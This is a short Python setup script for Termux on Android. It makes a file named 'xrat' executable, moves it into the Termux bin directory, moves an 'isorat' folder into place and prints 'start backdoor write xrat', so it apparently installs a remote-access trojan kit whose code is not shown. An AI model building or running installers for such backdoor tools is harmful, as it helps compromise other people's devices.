# __start__.py
import os
import sys
import time
W='\33[0m'
R='\33[1;31m'
G='\33[1;32m'
gr='\033[1;30m'
O='\33[1;33m'
B='\33[1;34m'
#:/data/data/com.termux/files/usr/etc/xrat
xx=os.path.exists('/data/data/com.termux/files/usr/etc/')
if xx == False:
	print(R+'[!] ERROR ')
	print(W)
	sys.exit()
os.system('chmod +x xrat')
os.system('cd isorat && mv xrat /data/data/com.termux/files/usr/bin')
os.system('mv isorat /data/data/com.termux/files/usr/etc/')
#os.system('/data/data/com.termux/files/home/isorat')
os.system('cd $HOME')
print(f'{W}[{R}✓{W}]{G} start backdoor write {R} xrat')	






